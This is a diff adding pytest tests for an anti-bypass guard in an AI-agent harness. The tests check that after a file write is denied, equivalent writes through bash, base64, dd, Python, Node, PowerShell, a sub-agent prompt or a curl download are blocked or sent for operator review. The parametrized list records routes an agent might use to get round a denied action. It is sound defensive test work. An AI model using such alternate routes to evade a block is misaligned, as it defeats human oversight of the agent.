@@ -346,6 +346,284 @@ class TestAntiBypassMemory:
         assert cross_tool.match_type == "cross_tool_script_similarity"
         assert cross_tool.action != "block"
 
+    def test_denied_native_write_blocks_equivalent_shell_write_to_same_target(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        guard.record_final_decision(
+            event=_event(
+                event_id="evt-native-write",
+                tool_name="Write",
+                payload={"path": "build/loader.sh", "content": "payload"},
+            ),
+            decision=_decision(policy_id="L1-rule-engine"),
+            snapshot=None,
+            meta={},
+            record_id=11,
+            config=cfg,
+        )
+
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-shell-write",
+                tool_name="bash",
+                payload={"command": "printf '%s' payload > build/loader.sh"},
+            ),
+            None,
+            cfg,
+        )
+
+        assert match is not None
+        assert match.match_type == "denied_effect_repeat"
+        assert match.action == "block"
+        meta = match.to_metadata()
+        assert meta["reason_codes"] == ["denied_effect_repeat"]
+        assert meta["evidence_categories"] == ["filesystem.write"]
+
+    @pytest.mark.parametrize(
+        ("tool_name", "payload"),
+        [
+            ("bash", {"command": "cat > build/loader.sh <<'EOF'\npayload\nEOF"}),
+            ("bash", {"command": "printf payload | tee build/loader.sh"}),
+            ("bash", {"command": "base64 -d payload.b64 > build/loader.sh"}),
+            ("bash", {"command": "dd if=/tmp/payload of=build/loader.sh"}),
+            ("python", {"command": "python -c \"open('build/loader.sh', 'w').write('payload')\""}),
+            ("node", {"command": "node -e \"require('fs').writeFileSync('build/loader.sh', 'payload')\""}),
+            ("powershell", {"command": "Set-Content -Path build/loader.sh -Value payload"}),
+            ("Agent", {"prompt": "Create build/loader.sh with the payload from the blocked write."}),
+            ("bash", {"command": "curl https://example.test/payload.sh -o build/loader.sh"}),
+        ],
+    )
+    def test_denied_native_write_matches_equivalent_write_families(self, tool_name, payload):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        guard.record_final_decision(
+            event=_event(
+                event_id="evt-native-write-family",
+                tool_name="Write",
+                payload={"path": "build/loader.sh", "content": "payload"},
+            ),
+            decision=_decision(policy_id="L1-rule-engine"),
+            snapshot=None,
+            meta={},
+            record_id=13,
+            config=cfg,
+        )
+
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-equivalent-write-family",
+                tool_name=tool_name,
+                payload=payload,
+            ),
+            None,
+            cfg,
+        )
+
+        assert match is not None
+        assert match.match_type == "denied_effect_repeat"
+        assert match.action == "block"
+
+    def test_denied_native_write_matches_powershell_quoted_path_with_spaces(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        guard.record_final_decision(
+            event=_event(
+                event_id="evt-native-write-space-path",
+                tool_name="Write",
+                payload={"path": "build/loader script.ps1", "content": "payload"},
+            ),
+            decision=_decision(policy_id="L1-rule-engine"),
+            snapshot=None,
+            meta={},
+            record_id=18,
+            config=cfg,
+        )
+
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-powershell-space-path",
+                tool_name="powershell",
+                payload={"command": "Set-Content -Path \"build/loader script.ps1\" -Value payload"},
+            ),
+            None,
+            cfg,
+        )
+
+        assert match is not None
+        assert match.match_type == "denied_effect_repeat"
+        assert match.action == "block"
+
+    def test_pending_defer_records_review_only_effect_hold(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        guard.record_final_decision(
+            event=_event(
+                event_id="evt-pending-write",
+                tool_name="Write",
+                payload={"path": "build/loader.sh", "content": "payload"},
+            ),
+            decision=CanonicalDecision(
+                decision=DecisionVerdict.DEFER,
+                reason="pending operator review",
+                policy_id="L1-rule-engine",
+                risk_level=RiskLevel.HIGH,
+                decision_source=DecisionSource.POLICY,
+                final=False,
+            ),
+            snapshot=None,
+            meta={},
+            record_id=12,
+            config=cfg,
+        )
+
+        assert guard.denied_effect_records_for_session("sess-anti-bypass") == []
+        pending = guard.pending_effect_holds_for_session("sess-anti-bypass")
+        assert len(pending) == 1
+        assert pending[0]["capability"] == "filesystem.write"
+
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-shell-write",
+                tool_name="bash",
+                payload={"command": "printf '%s' payload > build/loader.sh"},
+            ),
+            None,
+            cfg,
+        )
+
+        assert match is not None
+        assert match.match_type == "pending_effect_equivalent"
+        assert match.action == "defer"
+        assert "pending_effect_equivalent" in match.reason_codes
+        assert "denied_effect_repeat" not in match.reason_codes
+
+    def test_resolved_pending_effect_allow_clears_review_hold(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        event = _event(
+            event_id="evt-pending-allow",
+            tool_name="Write",
+            payload={"path": "build/loader.sh", "content": "payload"},
+        )
+        guard.record_final_decision(
+            event=event,
+            decision=CanonicalDecision(
+                decision=DecisionVerdict.DEFER,
+                reason="pending operator review",
+                policy_id="L1-rule-engine",
+                risk_level=RiskLevel.HIGH,
+                decision_source=DecisionSource.POLICY,
+                final=False,
+            ),
+            snapshot=None,
+            meta={},
+            record_id=14,
+            config=cfg,
+        )
+
+        guard.resolve_pending_effect_hold(
+            event=event,
+            decision=CanonicalDecision(
+                decision=DecisionVerdict.ALLOW,
+                reason="operator approved",
+                policy_id="defer-bridge",
+                risk_level=RiskLevel.HIGH,
+                decision_source=DecisionSource.OPERATOR,
+                final=True,
+            ),
+            record_id=15,
+            config=cfg,
+        )
+
+        assert guard.pending_effect_holds_for_session("sess-anti-bypass") == []
+        assert guard.denied_effect_records_for_session("sess-anti-bypass") == []
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-shell-after-allow",
+                tool_name="bash",
+                payload={"command": "printf '%s' payload > build/loader.sh"},
+            ),
+            None,
+            cfg,
+        )
+        assert match is None
+
+    def test_resolved_pending_effect_block_promotes_denied_effect(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True)
+        guard = AntiBypassGuard()
+        event = _event(
+            event_id="evt-pending-block",
+            tool_name="Write",
+            payload={"path": "build/loader.sh", "content": "payload"},
+        )
+        guard.record_final_decision(
+            event=event,
+            decision=CanonicalDecision(
+                decision=DecisionVerdict.DEFER,
+                reason="pending operator review",
+                policy_id="L1-rule-engine",
+                risk_level=RiskLevel.HIGH,
+                decision_source=DecisionSource.POLICY,
+                final=False,
+            ),
+            snapshot=None,
+            meta={},
+            record_id=16,
+            config=cfg,
+        )
+
+        guard.resolve_pending_effect_hold(
+            event=event,
+            decision=_decision(policy_id="defer-bridge"),
+            record_id=17,
+            config=cfg,
+        )
+
+        assert guard.pending_effect_holds_for_session("sess-anti-bypass") == []
+        assert guard.denied_effect_records_for_session("sess-anti-bypass")
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-shell-after-block",
+                tool_name="bash",
+                payload={"command": "printf '%s' payload > build/loader.sh"},
+            ),
+            None,
+            cfg,
+        )
+        assert match is not None
+        assert match.match_type == "denied_effect_repeat"
+
+    def test_normal_profile_artifact_family_match_routes_review_not_block(self):
+        cfg = DetectionConfig(anti_bypass_guard_enabled=True, mode="normal")
+        guard = AntiBypassGuard()
+        guard.record_final_decision(
+            event=_event(
+                event_id="evt-native-write-family-prior",
+                tool_name="Write",
+                payload={"path": "build/loader.sh", "content": "payload"},
+            ),
+            decision=_decision(policy_id="L1-rule-engine"),
+            snapshot=None,
+            meta={},
+            record_id=14,
+            config=cfg,
+        )
+
+        match = guard.match_pre_action(
+            _event(
+                event_id="evt-native-write-family-current",
+                tool_name="bash",
+                payload={"command": "printf '%s' payload > build/bootstrap.sh"},
+            ),
+            None,
+            cfg,
+        )
+
+        assert match is not None
+        assert match.match_type == "denied_effect_repeat"
+        assert match.action == "defer"
+        assert "artifact_family_match" in match.reason_codes
+
     def test_priority_ranking_prefers_older_exact_raw_over_newer_cross_tool_match(self):
         cfg = DetectionConfig(anti_bypass_guard_enabled=True)
         guard = AntiBypassGuard()
